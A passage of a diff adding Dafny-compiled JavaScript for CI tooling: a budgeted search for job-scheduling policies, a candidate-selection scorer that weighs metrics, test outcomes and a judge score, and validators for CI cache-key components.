+      let _0_jobs;
+      let _1_horizon;
+      let _rhs0 = environment2.dtor_jobs;
+      let _rhs1 = environment2.dtor_horizon;
+      _0_jobs = _rhs0;
+      _1_horizon = _rhs1;
+      let _2_count;
+      _2_count = CiPolicy.__default.PolicyCount(_0_jobs, _1_horizon);
+      if (budget.isLessThan(_2_count)) {
+        result = CiPolicy.Result.create_Exhausted(_2_count);
+        return result;
+      }
+      let _3_winner;
+      _3_winner = new BigNumber(-1);
+      let _4_rank;
+      _4_rank = _dafny.ZERO;
+      while (_4_rank.isLessThan(_2_count)) {
+        let _5_policy;
+        _5_policy = CiPolicy.__default.Decode(_0_jobs, _1_horizon, _4_rank);
+        if (CiPolicy.__default.Feasible(environment2, _5_policy)) {
+          if (_3_winner.isEqualTo(new BigNumber(-1))) {
+            _3_winner = _4_rank;
+          } else if (CiPolicy.__default.Preferred(CiPolicy.__default.Evaluate(environment2, _5_policy), _4_rank, CiPolicy.__default.Evaluate(environment2, CiPolicy.__default.Decode(_0_jobs, _1_horizon, _3_winner)), _3_winner)) {
+            _3_winner = _4_rank;
+          } else {
+          }
+        }
+        _4_rank = _4_rank.plus(_dafny.ONE);
+      }
+      if (_3_winner.isEqualTo(new BigNumber(-1))) {
+        result = CiPolicy.Result.create_Infeasible(_2_count);
+      } else {
+        let _6_policy;
+        _6_policy = CiPolicy.__default.Decode(_0_jobs, _1_horizon, _3_winner);
+        result = CiPolicy.Result.create_Optimal(_2_count, _3_winner, _6_policy, CiPolicy.__default.Evaluate(environment2, _6_policy));
+      }
+      return result;
+    }
+    static get MaxDuration() {
+      return new BigNumber(32);
+    }
+    static get MaxModeCost() {
+      return new BigNumber(1e6);
+    }
+    static get MaxCapacity() {
+      return new BigNumber(8);
+    }
+    static get MaxJobs() {
+      return new BigNumber(8);
+    }
+    static get MaxHorizon() {
+      return new BigNumber(16);
+    }
+    static get MaxModes() {
+      return new BigNumber(4);
+    }
+    static get MaxSearchBudget() {
+      return new BigNumber(25e4);
+    }
+    static get DefaultSearchBudget() {
+      return new BigNumber(5e4);
+    }
+  };
+  $module.Mode = class Mode {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Mode(duration2, cost, demand) {
+      let $dt = new Mode(0);
+      $dt.duration = duration2;
+      $dt.cost = cost;
+      $dt.demand = demand;
+      return $dt;
+    }
+    get is_Mode() {
+      return this.$tag === 0;
+    }
+    get dtor_duration() {
+      return this.duration;
+    }
+    get dtor_cost() {
+      return this.cost;
+    }
+    get dtor_demand() {
+      return this.demand;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Mode.Mode(" + _dafny.toString(this.duration) + ", " + _dafny.toString(this.cost) + ", " + _dafny.toString(this.demand) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.duration, other.duration) && _dafny.areEqual(this.cost, other.cost) && _dafny.areEqual(this.demand, other.demand);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Mode.create_Mode(_dafny.ZERO, _dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Mode.Default();
+        }
+      };
+    }
+  };
+  $module.Job = class Job {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Job(modes, needs) {
+      let $dt = new Job(0);
+      $dt.modes = modes;
+      $dt.needs = needs;
+      return $dt;
+    }
+    get is_Job() {
+      return this.$tag === 0;
+    }
+    get dtor_modes() {
+      return this.modes;
+    }
+    get dtor_needs() {
+      return this.needs;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Job.Job(" + _dafny.toString(this.modes) + ", " + _dafny.toString(this.needs) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.modes, other.modes) && _dafny.areEqual(this.needs, other.needs);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Job.create_Job(_dafny.Seq.of(), _dafny.Seq.of());
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Job.Default();
+        }
+      };
+    }
+  };
+  $module.Environment = class Environment {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Environment(jobs, horizon, capacity, costLimit) {
+      let $dt = new Environment(0);
+      $dt.jobs = jobs;
+      $dt.horizon = horizon;
+      $dt.capacity = capacity;
+      $dt.costLimit = costLimit;
+      return $dt;
+    }
+    get is_Environment() {
+      return this.$tag === 0;
+    }
+    get dtor_jobs() {
+      return this.jobs;
+    }
+    get dtor_horizon() {
+      return this.horizon;
+    }
+    get dtor_capacity() {
+      return this.capacity;
+    }
+    get dtor_costLimit() {
+      return this.costLimit;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Environment.Environment(" + _dafny.toString(this.jobs) + ", " + _dafny.toString(this.horizon) + ", " + _dafny.toString(this.capacity) + ", " + _dafny.toString(this.costLimit) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.jobs, other.jobs) && _dafny.areEqual(this.horizon, other.horizon) && _dafny.areEqual(this.capacity, other.capacity) && _dafny.areEqual(this.costLimit, other.costLimit);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Environment.create_Environment(_dafny.Seq.of(), _dafny.ZERO, _dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Environment.Default();
+        }
+      };
+    }
+  };
+  $module.Placement = class Placement {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Placement(mode, start2) {
+      let $dt = new Placement(0);
+      $dt.mode = mode;
+      $dt.start = start2;
+      return $dt;
+    }
+    get is_Placement() {
+      return this.$tag === 0;
+    }
+    get dtor_mode() {
+      return this.mode;
+    }
+    get dtor_start() {
+      return this.start;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Placement.Placement(" + _dafny.toString(this.mode) + ", " + _dafny.toString(this.start) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.mode, other.mode) && _dafny.areEqual(this.start, other.start);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Placement.create_Placement(_dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Placement.Default();
+        }
+      };
+    }
+  };
+  $module.Objective = class Objective {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Objective(makespan, cost) {
+      let $dt = new Objective(0);
+      $dt.makespan = makespan;
+      $dt.cost = cost;
+      return $dt;
+    }
+    get is_Objective() {
+      return this.$tag === 0;
+    }
+    get dtor_makespan() {
+      return this.makespan;
+    }
+    get dtor_cost() {
+      return this.cost;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Objective.Objective(" + _dafny.toString(this.makespan) + ", " + _dafny.toString(this.cost) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.makespan, other.makespan) && _dafny.areEqual(this.cost, other.cost);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Objective.create_Objective(_dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Objective.Default();
+        }
+      };
+    }
+  };
+  $module.Result = class Result2 {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Invalid() {
+      let $dt = new Result2(0);
+      return $dt;
+    }
+    static create_Exhausted(required) {
+      let $dt = new Result2(1);
+      $dt.required = required;
+      return $dt;
+    }
+    static create_Infeasible(examined) {
+      let $dt = new Result2(2);
+      $dt.examined = examined;
+      return $dt;
+    }
+    static create_Optimal(examined, rank2, policy2, objective) {
+      let $dt = new Result2(3);
+      $dt.examined = examined;
+      $dt.rank = rank2;
+      $dt.policy = policy2;
+      $dt.objective = objective;
+      return $dt;
+    }
+    get is_Invalid() {
+      return this.$tag === 0;
+    }
+    get is_Exhausted() {
+      return this.$tag === 1;
+    }
+    get is_Infeasible() {
+      return this.$tag === 2;
+    }
+    get is_Optimal() {
+      return this.$tag === 3;
+    }
+    get dtor_required() {
+      return this.required;
+    }
+    get dtor_examined() {
+      return this.examined;
+    }
+    get dtor_rank() {
+      return this.rank;
+    }
+    get dtor_policy() {
+      return this.policy;
+    }
+    get dtor_objective() {
+      return this.objective;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Result.Invalid";
+      } else if (this.$tag === 1) {
+        return "CiPolicy.Result.Exhausted(" + _dafny.toString(this.required) + ")";
+      } else if (this.$tag === 2) {
+        return "CiPolicy.Result.Infeasible(" + _dafny.toString(this.examined) + ")";
+      } else if (this.$tag === 3) {
+        return "CiPolicy.Result.Optimal(" + _dafny.toString(this.examined) + ", " + _dafny.toString(this.rank) + ", " + _dafny.toString(this.policy) + ", " + _dafny.toString(this.objective) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1 && _dafny.areEqual(this.required, other.required);
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.examined, other.examined);
+      } else if (this.$tag === 3) {
+        return other.$tag === 3 && _dafny.areEqual(this.examined, other.examined) && _dafny.areEqual(this.rank, other.rank) && _dafny.areEqual(this.policy, other.policy) && _dafny.areEqual(this.objective, other.objective);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Result.create_Invalid();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Result2.Default();
+        }
+      };
+    }
+  };
+  return $module;
+})();
+var Policy = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "Policy._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static Resolve(updates) {
+      let severity = _dafny.ZERO;
+      severity = _dafny.ZERO;
+      let _0_i;
+      _0_i = _dafny.ZERO;
+      while (_0_i.isLessThan(new BigNumber(updates.length))) {
+        if (!updates[_0_i].isEqualTo(new BigNumber(-1))) {
+          severity = updates[_0_i];
+        }
+        _0_i = _0_i.plus(_dafny.ONE);
+      }
+      return severity;
+    }
+  };
+  return $module;
+})();
+var Selection = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "Selection._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static ValidMetric(m) {
+      return _dafny.ZERO.minus(Selection.__default.Scale).isLessThanOrEqualTo(m.dtor_delta) && m.dtor_delta.isLessThanOrEqualTo(Selection.__default.Scale) && _dafny.ZERO.isLessThanOrEqualTo(m.dtor_weight) && (new BigNumber(-1).isLessThanOrEqualTo(m.dtor_regressionLimit) && m.dtor_regressionLimit.isLessThanOrEqualTo(Selection.__default.Scale));
+    }
+    static Weight(ms) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(ms.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = _0___accumulator.plus(ms[_dafny.ZERO].dtor_weight);
+          let _in0 = ms.slice(_dafny.ONE);
+          ms = _in0;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Weighted(ms) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(ms.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = _0___accumulator.plus(ms[_dafny.ZERO].dtor_weight.multipliedBy(ms[_dafny.ZERO].dtor_delta));
+          let _in0 = ms.slice(_dafny.ONE);
+          ms = _in0;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Valid(c2, minimum, influence) {
+      return !c2.dtor_invalid && (_dafny.ZERO.isLessThanOrEqualTo(minimum) && minimum.isLessThanOrEqualTo(Selection.__default.Scale)) && (_dafny.ZERO.isLessThanOrEqualTo(influence) && influence.isLessThanOrEqualTo(_dafny.EuclideanDivision(Selection.__default.Scale, new BigNumber(2)))) && (new BigNumber(-1).isLessThanOrEqualTo(c2.dtor_tests) && c2.dtor_tests.isLessThanOrEqualTo(_dafny.ONE)) && (new BigNumber(-1).isLessThanOrEqualTo(c2.dtor_controlTests) && c2.dtor_controlTests.isLessThanOrEqualTo(_dafny.ONE)) && (new BigNumber(-1).isLessThanOrEqualTo(c2.dtor_judge) && c2.dtor_judge.isLessThanOrEqualTo(Selection.__default.Scale)) && _dafny.ZERO.isLessThan(new BigNumber(c2.dtor_metrics.length)) && _dafny.Quantifier(c2.dtor_metrics.UniqueElements, true, function(_forall_var_0) {
+        let _0_m = _forall_var_0;
+        return !_dafny.Seq.contains(c2.dtor_metrics, _0_m) || Selection.__default.ValidMetric(_0_m);
+      }) && _dafny.ZERO.isLessThan(Selection.__default.Weight(c2.dtor_metrics));
+    }
+    static Round(numerator, denominator) {
+      return _dafny.EuclideanDivision(new BigNumber(2).multipliedBy(numerator).plus(denominator), new BigNumber(2).multipliedBy(denominator));
+    }
+    static Mean(ms) {
+      return Selection.__default.Round(Selection.__default.Weighted(ms), Selection.__default.Weight(ms));
+    }
+    static Rank(score, judge, influence) {
+      if (judge.isEqualTo(new BigNumber(-1))) {
+        return score;
+      } else {
+        let _0_numerator = Selection.__default.Scale.minus(influence).multipliedBy(score).plus(influence.multipliedBy(new BigNumber(2).multipliedBy(judge).minus(Selection.__default.Scale)));
+        return Selection.__default.Round(_0_numerator, Selection.__default.Scale);
+      }
+    }
+    static Regression(ms) {
+      return _dafny.Quantifier(ms.UniqueElements, false, function(_exists_var_0) {
+        let _0_m = _exists_var_0;
+        return _dafny.Seq.contains(ms, _0_m) && (_0_m.dtor_measured && _dafny.ZERO.isLessThanOrEqualTo(_0_m.dtor_regressionLimit) && _0_m.dtor_delta.isLessThan(_dafny.ZERO.minus(_0_m.dtor_regressionLimit)));
+      });
+    }
+    static HardFailure(c2, minimum, influence) {
+      return !Selection.__default.Valid(c2, minimum, influence) || c2.dtor_tests.isEqualTo(_dafny.ZERO) || c2.dtor_controlTests.isEqualTo(_dafny.ZERO) || c2.dtor_armError || c2.dtor_controlError || c2.dtor_protectedPath || Selection.__default.Regression(c2.dtor_metrics);
+    }
+    static Pending(c2) {
+      return c2.dtor_tests.isEqualTo(new BigNumber(-1)) || c2.dtor_controlTests.isEqualTo(new BigNumber(-1)) || _dafny.Quantifier(c2.dtor_metrics.UniqueElements, false, function(_exists_var_0) {
+        let _0_m = _exists_var_0;
+        return _dafny.Seq.contains(c2.dtor_metrics, _0_m) && !_0_m.dtor_measured;
+      });
+    }
+    static Evaluate(c2, minimum, influence) {
+      let _0_valid = Selection.__default.Valid(c2, minimum, influence);
+      let _1_score = _0_valid ? Selection.__default.Mean(c2.dtor_metrics) : _dafny.ZERO;
+      let _2_rank = _0_valid ? Selection.__default.Rank(_1_score, c2.dtor_judge, influence) : _dafny.ZERO;
+      let _3_failed = Selection.__default.HardFailure(c2, minimum, influence);
+      let _4_pending = Selection.__default.Pending(c2);
+      return Selection.Score.create_Score(_1_score, _2_rank, _3_failed, _4_pending, !_3_failed && !_4_pending && minimum.isLessThanOrEqualTo(_1_score));
+    }
+    static Preferred(a, ai, b, bi) {
+      return b.dtor_rank.isLessThan(a.dtor_rank) || a.dtor_rank.isEqualTo(b.dtor_rank) && (b.dtor_deterministic.isLessThan(a.dtor_deterministic) || a.dtor_deterministic.isEqualTo(b.dtor_deterministic) && ai.isLessThanOrEqualTo(bi));
+    }
+    static Select(cs, minimum, influence) {
+      let winner = _dafny.ZERO;
+      let unfinished = false;
+      winner = new BigNumber(-1);
+      unfinished = false;
+      let _0_i;
+      _0_i = _dafny.ZERO;
+      while (_0_i.isLessThan(new BigNumber(cs.length))) {
+        let _1_next;
+        _1_next = Selection.__default.Evaluate(cs[_0_i], minimum, influence);
+        unfinished = unfinished || _1_next.dtor_pending && !_1_next.dtor_failed;
+        if (_1_next.dtor_eligible) {
+          if (winner.isEqualTo(new BigNumber(-1))) {
+            winner = _0_i;
+          } else if (Selection.__default.Preferred(_1_next, _0_i, Selection.__default.Evaluate(cs[winner], minimum, influence), winner)) {
+            winner = _0_i;
+          } else {
+          }
+        }
+        _0_i = _0_i.plus(_dafny.ONE);
+      }
+      return [winner, unfinished];
+    }
+    static Reduce(cs, minimum, influence, running, expired) {
+      let action = Selection.Action.Default();
+      if (!running) {
+        action = Selection.Action.create_Skip();
+        return action;
+      }
+      let _0_winner;
+      let _1_unfinished;
+      let _out0;
+      let _out1;
+      let _outcollector0 = Selection.__default.Select(cs, minimum, influence);
+      _out0 = _outcollector0[0];
+      _out1 = _outcollector0[1];
+      _0_winner = _out0;
+      _1_unfinished = _out1;
+      if (_dafny.ZERO.isLessThanOrEqualTo(_0_winner) && (!_1_unfinished || expired)) {
+        action = Selection.Action.create_Promote(_0_winner);
+      } else if (expired) {
+        action = Selection.Action.create_Expire();
+      } else if (!_1_unfinished) {
+        action = Selection.Action.create_Reject();
+      } else {
+        action = Selection.Action.create_Wait();
+      }
+      return action;
+    }
+    static get Scale() {
+      return new BigNumber(1e4);
+    }
+  };
+  $module.Metric = class Metric {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Metric(delta, weight, measured, regressionLimit) {
+      let $dt = new Metric(0);
+      $dt.delta = delta;
+      $dt.weight = weight;
+      $dt.measured = measured;
+      $dt.regressionLimit = regressionLimit;
+      return $dt;
+    }
+    get is_Metric() {
+      return this.$tag === 0;
+    }
+    get dtor_delta() {
+      return this.delta;
+    }
+    get dtor_weight() {
+      return this.weight;
+    }
+    get dtor_measured() {
+      return this.measured;
+    }
+    get dtor_regressionLimit() {
+      return this.regressionLimit;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Metric.Metric(" + _dafny.toString(this.delta) + ", " + _dafny.toString(this.weight) + ", " + _dafny.toString(this.measured) + ", " + _dafny.toString(this.regressionLimit) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.delta, other.delta) && _dafny.areEqual(this.weight, other.weight) && this.measured === other.measured && _dafny.areEqual(this.regressionLimit, other.regressionLimit);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Metric.create_Metric(_dafny.ZERO, _dafny.ZERO, false, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Metric.Default();
+        }
+      };
+    }
+  };
+  $module.Candidate = class Candidate {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Candidate(metrics, tests, controlTests, armError, controlError, protectedPath, invalid, judge) {
+      let $dt = new Candidate(0);
+      $dt.metrics = metrics;
+      $dt.tests = tests;
+      $dt.controlTests = controlTests;
+      $dt.armError = armError;
+      $dt.controlError = controlError;
+      $dt.protectedPath = protectedPath;
+      $dt.invalid = invalid;
+      $dt.judge = judge;
+      return $dt;
+    }
+    get is_Candidate() {
+      return this.$tag === 0;
+    }
+    get dtor_metrics() {
+      return this.metrics;
+    }
+    get dtor_tests() {
+      return this.tests;
+    }
+    get dtor_controlTests() {
+      return this.controlTests;
+    }
+    get dtor_armError() {
+      return this.armError;
+    }
+    get dtor_controlError() {
+      return this.controlError;
+    }
+    get dtor_protectedPath() {
+      return this.protectedPath;
+    }
+    get dtor_invalid() {
+      return this.invalid;
+    }
+    get dtor_judge() {
+      return this.judge;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Candidate.Candidate(" + _dafny.toString(this.metrics) + ", " + _dafny.toString(this.tests) + ", " + _dafny.toString(this.controlTests) + ", " + _dafny.toString(this.armError) + ", " + _dafny.toString(this.controlError) + ", " + _dafny.toString(this.protectedPath) + ", " + _dafny.toString(this.invalid) + ", " + _dafny.toString(this.judge) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.metrics, other.metrics) && _dafny.areEqual(this.tests, other.tests) && _dafny.areEqual(this.controlTests, other.controlTests) && this.armError === other.armError && this.controlError === other.controlError && this.protectedPath === other.protectedPath && this.invalid === other.invalid && _dafny.areEqual(this.judge, other.judge);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Candidate.create_Candidate(_dafny.Seq.of(), _dafny.ZERO, _dafny.ZERO, false, false, false, false, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Candidate.Default();
+        }
+      };
+    }
+  };
+  $module.Score = class Score {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Score(deterministic, rank2, failed, pending, eligible2) {
+      let $dt = new Score(0);
+      $dt.deterministic = deterministic;
+      $dt.rank = rank2;
+      $dt.failed = failed;
+      $dt.pending = pending;
+      $dt.eligible = eligible2;
+      return $dt;
+    }
+    get is_Score() {
+      return this.$tag === 0;
+    }
+    get dtor_deterministic() {
+      return this.deterministic;
+    }
+    get dtor_rank() {
+      return this.rank;
+    }
+    get dtor_failed() {
+      return this.failed;
+    }
+    get dtor_pending() {
+      return this.pending;
+    }
+    get dtor_eligible() {
+      return this.eligible;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Score.Score(" + _dafny.toString(this.deterministic) + ", " + _dafny.toString(this.rank) + ", " + _dafny.toString(this.failed) + ", " + _dafny.toString(this.pending) + ", " + _dafny.toString(this.eligible) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.deterministic, other.deterministic) && _dafny.areEqual(this.rank, other.rank) && this.failed === other.failed && this.pending === other.pending && this.eligible === other.eligible;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Score.create_Score(_dafny.ZERO, _dafny.ZERO, false, false, false);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Score.Default();
+        }
+      };
+    }
+  };
+  $module.Action = class Action {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Skip() {
+      let $dt = new Action(0);
+      return $dt;
+    }
+    static create_Wait() {
+      let $dt = new Action(1);
+      return $dt;
+    }
+    static create_Promote(index) {
+      let $dt = new Action(2);
+      $dt.index = index;
+      return $dt;
+    }
+    static create_Reject() {
+      let $dt = new Action(3);
+      return $dt;
+    }
+    static create_Expire() {
+      let $dt = new Action(4);
+      return $dt;
+    }
+    get is_Skip() {
+      return this.$tag === 0;
+    }
+    get is_Wait() {
+      return this.$tag === 1;
+    }
+    get is_Promote() {
+      return this.$tag === 2;
+    }
+    get is_Reject() {
+      return this.$tag === 3;
+    }
+    get is_Expire() {
+      return this.$tag === 4;
+    }
+    get dtor_index() {
+      return this.index;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Action.Skip";
+      } else if (this.$tag === 1) {
+        return "Selection.Action.Wait";
+      } else if (this.$tag === 2) {
+        return "Selection.Action.Promote(" + _dafny.toString(this.index) + ")";
+      } else if (this.$tag === 3) {
+        return "Selection.Action.Reject";
+      } else if (this.$tag === 4) {
+        return "Selection.Action.Expire";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.index, other.index);
+      } else if (this.$tag === 3) {
+        return other.$tag === 3;
+      } else if (this.$tag === 4) {
+        return other.$tag === 4;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Action.create_Skip();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Action.Default();
+        }
+      };
+    }
+  };
+  return $module;
+})();
+var CacheKey = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "CacheKey._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static Val(c2, r) {
+      let _source0 = c2;
+      {
+        if (_source0.is_Lit) {
+          let _0_s = _source0.s;
+          return _0_s;
+        }
+      }
+      {
+        if (_source0.is_RunnerOs) {
+          return r.dtor_os;
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          let _1_id = _source0.id;
+          if (r.dtor_files.contains(_1_id)) {
+            return r.dtor_files.get(_1_id);
+          } else {
+            return _dafny.Seq.UnicodeFromString("");
+          }
+        }
+      }
+      {
+        let _2_v = _source0.c;
+        if (r.dtor_ctx.contains(_2_v)) {
+          return r.dtor_ctx.get(_2_v);
+        } else {
+          return _dafny.Seq.UnicodeFromString("");
+        }
+      }
+    }
+    static Render(t, r) {
+      let _0___accumulator = _dafny.Seq.of();
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.Seq.Concat(_0___accumulator, _dafny.Seq.UnicodeFromString(""));
+        } else {
+          _0___accumulator = _dafny.Seq.Concat(_0___accumulator, CacheKey.__default.Val(t[_dafny.ZERO], r));
+          let _in0 = t.slice(_dafny.ONE);
+          let _in1 = r;
+          t = _in0;
+          r = _in1;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static ClassOf(c2) {
+      let _source0 = c2;
+      {
+        if (_source0.is_Lit) {
+          return CacheKey.Cls.create_Any();
+        }
+      }
+      {
+        if (_source0.is_RunnerOs) {
+          return CacheKey.Cls.create_Letters();
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          return CacheKey.Cls.create_Hex();
+        }
+      }
+      {
+        let _0_v = _source0.c;
+        if (_dafny.areEqual(_0_v, CacheKey.CtxVar.create_Sha())) {
+          return CacheKey.Cls.create_Hex();
+        } else if (_dafny.areEqual(_0_v, CacheKey.CtxVar.create_RunId()) || _dafny.areEqual(_0_v, CacheKey.CtxVar.create_RunNumber()) || _dafny.areEqual(_0_v, CacheKey.CtxVar.create_RunAttempt())) {
+          return CacheKey.Cls.create_Digits();
+        } else {
+          return CacheKey.Cls.create_Any();
+        }
+      }
+    }
+    static FixedLen(c2) {
+      if (_dafny.areEqual(c2, CacheKey.Comp.create_Ctx(CacheKey.CtxVar.create_Sha()))) {
+        return new BigNumber(40);
+      } else {
+        return _dafny.ZERO;
+      }
+    }
+    static InClass(k, ch) {
+      let _source0 = k;
+      {
+        if (_source0.is_Letters) {
+          return new _dafny.CodePoint("a".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("z".codePointAt(0))) || new _dafny.CodePoint("A".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("Z".codePointAt(0)));
+        }
+      }
+      {
+        if (_source0.is_Hex) {
+          return new _dafny.CodePoint("0".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("9".codePointAt(0))) || new _dafny.CodePoint("a".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("f".codePointAt(0)));
+        }
+      }
+      {
+        if (_source0.is_Digits) {
+          return new _dafny.CodePoint("0".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("9".codePointAt(0)));
+        }
+      }
+      {
+        return true;
+      }
+    }
+    static AllIn(k, s) {
+      return _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(s.length)), true, function(_forall_var_0) {
+        let _0_i = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_i) && _0_i.isLessThan(new BigNumber(s.length))) || CacheKey.__default.InClass(k, s[_0_i]);
+      });
+    }
+    static InDomain(c2, v) {
+      let _source0 = c2;
+      {
+        if (_source0.is_Lit) {
+          let _0_s = _source0.s;
+          return _dafny.areEqual(v, _0_s);
+        }
+      }
+      {
+        if (_source0.is_RunnerOs) {
+          return _dafny.areEqual(v, _dafny.Seq.UnicodeFromString("Linux")) || _dafny.areEqual(v, _dafny.Seq.UnicodeFromString("Windows")) || _dafny.areEqual(v, _dafny.Seq.UnicodeFromString("macOS"));
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          return (new BigNumber(v.length).isEqualTo(_dafny.ZERO) || new BigNumber(v.length).isEqualTo(new BigNumber(64))) && CacheKey.__default.AllIn(CacheKey.Cls.create_Hex(), v);
+        }
+      }
+      {
+        let _1_x = _source0.c;
+        if (_dafny.areEqual(_1_x, CacheKey.CtxVar.create_Sha())) {
+          return new BigNumber(v.length).isEqualTo(new BigNumber(40)) && CacheKey.__default.AllIn(CacheKey.Cls.create_Hex(), v);
+        } else if (_dafny.areEqual(_1_x, CacheKey.CtxVar.create_RunId()) || _dafny.areEqual(_1_x, CacheKey.CtxVar.create_RunNumber()) || _dafny.areEqual(_1_x, CacheKey.CtxVar.create_RunAttempt())) {
+          return _dafny.ZERO.isLessThan(new BigNumber(v.length)) && CacheKey.__default.AllIn(CacheKey.Cls.create_Digits(), v);
+        } else {
+          return true;
